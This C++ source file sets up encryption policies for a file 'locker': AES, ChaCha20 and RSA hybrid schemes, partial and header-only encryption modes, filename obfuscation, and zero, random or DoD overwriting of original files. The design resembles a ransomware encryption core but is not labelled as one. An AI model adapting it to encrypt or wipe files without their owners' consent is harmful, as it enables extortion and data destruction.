#include "locker.h"
#include "memory.h"
#include "logs.h"
#include "global_parameters.h"
#include "crypto/aes/aes256.h"
#include "crypto/chacha20/ecrypt-sync.h"
#include "filesystem/filesystem.h"

#ifdef _WIN32
#include "crypto/rsa/rsa.h"
#endif

constexpr unsigned MB = 1048576;

void aes_block_fn(PFILE_INFO FileInfo, crypto_aes_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
{
	aes_encrypt_blocks(ctx, in, out, bytes, padding, FileInfo->crypt_info->mode);
}


void chacha_block_fn(PFILE_INFO FileInfo, laced_ctx* ctx, u32* padding, BYTE* in, BYTE* out, u32 bytes)
{
	ECRYPT_encrypt_bytes(ctx, in, out, bytes);
}

static void HandlerGenKeyChaCha(laced_ctx* CryptCtx, CONST BYTE* ChaChaKey, CONST BYTE* ChaChaIV)
{
	memory::memzero_explicit(CryptCtx, sizeof(laced_ctx));
	ECRYPT_keysetup(CryptCtx, ChaChaKey, 256, 64);
	ECRYPT_ivsetup(CryptCtx, ChaChaIV);
}

static void HandlerGenKeyAES(crypto_aes_ctx* CryptCtx, CONST BYTE* AESKey)
{
	memory::memzero_explicit(CryptCtx, sizeof(crypto_aes_ctx));
	aes_expandkey(CryptCtx, AESKey);
}

static bool SymmetricMethodState(PFILE_INFO FileInfo)
{
	if (FileInfo->crypt_info->methods.gen_policy == GENKEY_EVERY_ONCE)
		FileInfo->crypt_info->methods.gen_key_method(FileInfo->ctx, GLOBAL_KEYS.g_Key, FileInfo->hblock->IV);

	return FileInfo->crypt_info->methods.mode_method(FileInfo);
}

static bool HybridMethodStateCrypt(PFILE_INFO FileInfo)
{
	if (!filesystem::FileCryptEncrypt(FileInfo))
	{
		LOG_ERROR("[CryptEncrypt] Failed; " log_str, FileInfo->filename);
		return false;
	}

	return true;
}

static bool HybridMethodStateDecrypt(PFILE_INFO FileInfo)
{
	if (!filesystem::FileCryptDecrypt(FileInfo))
	{
		LOG_ERROR("[CryptDecrypt] Failed; " log_str, FileInfo->filename);
		return false;
	}

	return true;
}


static bool RSAOnlyMethodState(PFILE_INFO FileInfo)
{
	if (!filesystem::EncryptRSA(FileInfo))
	{
		LOG_ERROR("[EncryptRSA] Failed Encrypt/Decrypt ONLY RSA; " log_str, FileInfo->filename);
		return false;
	}

	return true;
}

EncryptAlgoMethod init_hybrid(u32* mode)
{
	if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::CRYPT)
	{
		*mode = GLOBAL_ENUM.g_EncryptMode == EncryptModes::FULL_ENCRYPT ? MODE_AES::AES_CRYPT : MODE_AES::AES_CRYPT_NO_PADDING; 
		return (EncryptAlgoMethod)HybridMethodStateCrypt;
	}
	else if (GLOBAL_ENUM.g_DeCrypt == EncryptCipher::DECRYPT)
	{
		*mode = GLOBAL_ENUM.g_EncryptMode == EncryptModes::FULL_ENCRYPT ? MODE_AES::AES_DECRYPT : MODE_AES::AES_DECRYPT_NO_PADDING;
		return (EncryptAlgoMethod)HybridMethodStateDecrypt;
	}
	
	LOG_ERROR("[GeneratePolicy] Failed; missing crypt/decrypt");
	return NULL;
}

bool locker::CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info)
{
	crypt_info->methods.hash_sum_method = (HashSumFunc)filesystem::nopHashSumFile;
	u32 mode_ = 0;

	switch (policy)
	{
	case CryptoPolicy::AES256:
	{
		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
		*crypt_info = 
		CRYPT_INFO{
			.ctx = (crypto_aes_ctx*)memory::m_malloc(sizeof(crypto_aes_ctx)), 
			.name = "AES256",
			.mode = mode_,
			.methods =
			{
				.method_policy = CryptoPolicy::AES256,
				.gen_policy = GENKEY_ONCE,
				.crypt_method = (EncryptMethodFunc)aes_block_fn,
				.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES,
				.algo_method = (EncryptAlgoMethod)SymmetricMethodState,
			},
		};
		crypt_info->methods.gen_key_method(crypt_info->ctx, GLOBAL_KEYS.g_Key, NULL);
		break;
	}
	case CryptoPolicy::CHACHA:
	{
		*crypt_info = 
		CRYPT_INFO{
			.name = "ChaCha20",
			.mode = 0,
			.methods =
			{
				.method_policy = CryptoPolicy::CHACHA,
				.gen_policy = GENKEY_EVERY_ONCE,
				.crypt_method = (EncryptMethodFunc)chacha_block_fn,
				.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha,
				.algo_method = (EncryptAlgoMethod)SymmetricMethodState
			},
		};
		break;
	}
	case CryptoPolicy::RSA_AES256:
	{	
		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
		*crypt_info = 
		CRYPT_INFO{
			.ctx = NULL,
			.desc = 
			{
				.key_data = (BYTE*)memory::m_malloc(4096),
				.rsa_path = GLOBAL_PATH.g_PathRSAKey,
#ifdef _WIN32
				.crypto_provider = NULL,
				.handle_rsa_key = NULL,
#else
				.PKEY = NULL,
				.bio = NULL,
#endif
			},
			.name = "RSA_AES256",
			.mode = mode_,
			.methods =
			{
				.method_policy = CryptoPolicy::RSA_AES256,
				.gen_policy = GENKEY_EVERY_ONCE,
				.crypt_method = (EncryptMethodFunc)aes_block_fn,
				.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyAES,
				.algo_method = algm
			}
		};
		if (!filesystem::ReadRSAFile(crypt_info))
		{
			LOG_ERROR("[ReadRSAFile] Failed; " log_str, crypt_info->desc.rsa_path);
			return false;
		}
		break;
	}
	case CryptoPolicy::RSA_CHACHA:
	{
		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
		*crypt_info = 
		CRYPT_INFO{
			.desc = 
			{
				.key_data = (BYTE*)memory::m_malloc(4096),
				.rsa_path = GLOBAL_PATH.g_PathRSAKey,
#ifdef _WIN32
				.crypto_provider = NULL,
				.handle_rsa_key = NULL,
#else
				.PKEY = NULL,
				.bio = NULL,
#endif
			},
			.name = "RSA_CHACHA",
			.mode = mode_,
			.methods =
			{
				.method_policy = CryptoPolicy::RSA_CHACHA,
				.gen_policy = GENKEY_EVERY_ONCE,
				.crypt_method = (EncryptMethodFunc)chacha_block_fn,
				.gen_key_method = (EncryptGenKeyFunc)HandlerGenKeyChaCha,
				.algo_method = algm
			}
		};
		if (!filesystem::ReadRSAFile(crypt_info))
		{
			LOG_ERROR("[ReadRSAFile] Failed; " log_str, crypt_info->desc.rsa_path);
			return false;
		}
		break;
	}
	case CryptoPolicy::RSA:
	{
		auto algm= (EncryptAlgoMethod)init_hybrid(&mode_);
		*crypt_info = 
		CRYPT_INFO{
			.desc = 
			{
				.key_data = (BYTE*)memory::m_malloc(4096),
				.rsa_path = GLOBAL_PATH.g_PathRSAKey,
#ifdef _WIN32
				.crypto_provider = NULL,
				.handle_rsa_key = NULL,
#else
				.PKEY = NULL,
				.bio = NULL,
#endif
			},
			.name = "RSA",
			.mode = 0,
			.methods =
			{
				.method_policy = CryptoPolicy::RSA,
				.gen_policy = NONE,
				.crypt_method = NULL,
				.gen_key_method = NULL,
				.algo_method = (EncryptAlgoMethod)RSAOnlyMethodState
			},
		};
		if (!filesystem::ReadRSAFile(crypt_info))
		{
			LOG_ERROR("[ReadRSAFile] Failed; " log_str, crypt_info->desc.rsa_path);
			return false;
		}
		break;
	}
	default:
		break;		
	}

	crypt_info->methods.overwrite_method = (OverWriteFunc)filesystem::nopOverWriteFile;
	return true;
}

bool locker::GeneratePolicy(CRYPT_INFO* CryptInfo)
{
	if(!CryptoSystemInit(GLOBAL_ENUM.g_EncryptMethod, CryptInfo))
	{
		LOG_ERROR("[GeneratePolicy] [CryptoSystemInit] Failed");
		return false;
	}

	if(true) /* if not unsafe*/
	{
		CryptInfo->list_psd = new LIST<LIST_PSD>;
	}

	if(CommandParser::HASH_FILE)
	{
		CryptInfo->hash_data.HashList = new SLIST<HASH_LIST>;
		CryptInfo->methods.hash_sum_method = (HashSumFunc)filesystem::hash_file;
		return true;
	}
	
	if (CommandParser::signature)
	{
		CryptInfo->hash_data.HashList = new SLIST<HASH_LIST>;
		CryptInfo->methods.hash_sum_method = (HashSumFunc)filesystem::HashSumFile;
	}

	if (GLOBAL_OVERWRITE.g_OverWrite)
	{
		switch (GLOBAL_OVERWRITE.g_OverWriteMode)
		{
		case overwrite::ZEROS:
		{
			CryptInfo->methods.overwrite_method = (OverWriteFunc)filesystem::ZerosOverWriteFile;
			CryptInfo->zeros = (BYTE*)memory::m_malloc(MB);
			memory::memzero_explicit(CryptInfo->zeros, MB);
			CryptInfo->random = NULL;
			break;
		}
		case overwrite::RANDOM:
		{
			CryptInfo->methods.overwrite_method = (OverWriteFunc)filesystem::RandomOverWriteFile;
			CryptInfo->random = (BYTE*)memory::m_malloc(MB);
#ifdef _WIN32
			BCryptGenRandom(0, CryptInfo->random, MB, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
#else
			RAND_bytes(CryptInfo->random, MB);
#endif
			CryptInfo->zeros = NULL;
			break;
		}
		case overwrite::DOD:
		{
			CryptInfo->methods.overwrite_method = (OverWriteFunc)filesystem::DODOverWriteFile;
			CryptInfo->zeros = (BYTE*)memory::m_malloc(MB);
			memory::memzero_explicit(CryptInfo->zeros, MB);
			CryptInfo->random = (BYTE*)memory::m_malloc(MB);
#ifdef _WIN32
			BCryptGenRandom(0, CryptInfo->random, MB, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
#else
			RAND_bytes(CryptInfo->random, MB);
#endif
			break;
		}
		}
		if (CommandParser::O_REWRITE)
			return TRUE;
	}

	switch (GLOBAL_ENUM.g_EncryptMode)
	{
	case EncryptModes::FULL_ENCRYPT:
		CryptInfo->methods.mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeFULL;
		break;
	case EncryptModes::PARTLY_ENCRYPT:
		CryptInfo->methods.mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModePARTLY;
		break;
	case EncryptModes::HEADER_ENCRYPT:
		CryptInfo->methods.mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeHEADER;
		break;
	case EncryptModes::BLOCK_ENCRYPT:
		CryptInfo->methods.mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeBLOCK;
		break;
	case EncryptModes::AUTO_ENCRYPT:
		CryptInfo->methods.mode_method = (OptionEncryptModeFunc)filesystem::OptionEncryptModeAUTO;
		break;
	case EncryptModes::PIPELINE_ENCRYPT:
		break;
	default:
		LOG_ERROR("[ENCRYPT MODE] Failed; missing state mode");
		return false;
	}

	switch (GLOBAL_ENUM.g_CryptName)
	{
	case NAME::BASE64_NAME_CRYPT:
	case NAME::BASE64_NAME:
		CryptInfo->methods.name_method = (OptionNameFunc)filesystem::OptionNameBase;
		break;
	case NAME::HASH_NAME:
		CryptInfo->methods.name_method = (OptionNameFunc)filesystem::OptionNameHash;
		break;
	default:
		CryptInfo->methods.name_method = (OptionNameFunc)filesystem::OptionNameStandart;
		break;
	}

	if(CommandParser::BASE64)
        base64::init_table_base64_decode();

	return true;
}


void locker::FreeCryptInfo(CRYPT_INFO* CryptInfo)
{
	if (!CryptInfo)
		return;


	if (CryptInfo->hash_data.HashList)
	{
		PHLIST dataHash = NULL;
		SLIST_FOREACH(dataHash, CryptInfo->hash_data.HashList)
			memory::m_free(dataHash->hash);

		delete CryptInfo->hash_data.HashList;
	}

	if(CommandParser::HASH_FILE)
	{
		memory::m_free(CryptInfo);
		return;
	}

	if (CryptInfo->zeros)
		memory::m_free(CryptInfo->zeros);
	if (CryptInfo->random)
		memory::m_free(CryptInfo->random);

	if (CryptInfo->desc.key_data)
	{
		memory::memzero_explicit(CryptInfo->desc.key_data, 4096);
		memory::m_free(CryptInfo->desc.key_data);
		CryptInfo->desc.key_data = NULL;
	}

#ifdef _WIN32
	if (CryptInfo->desc.handle_rsa_key)
	{
		BCryptDestroyKey(CryptInfo->desc.handle_rsa_key);
		CryptInfo->desc.handle_rsa_key = NULL;
	}

	if (CryptInfo->desc.crypto_provider)
	{
		BCryptCloseAlgorithmProvider(CryptInfo->desc.crypto_provider, 0);
		CryptInfo->desc.crypto_provider = NULL;
	}
#else
	if (CryptInfo->desc.bio)
		BIO_free(CryptInfo->desc.bio);
	if (CryptInfo->desc.PKEY)
		EVP_PKEY_free(CryptInfo->desc.PKEY);
#endif

	if (CryptInfo->ctx)
	{
		memory::memzero_explicit(CryptInfo->ctx, sizeof(CryptInfo->ctx));
		memory::m_free(CryptInfo->ctx);
		CryptInfo->ctx = NULL;
	}

	if(CryptInfo->list_psd)
		delete CryptInfo->list_psd;

	memory::m_free(CryptInfo);
}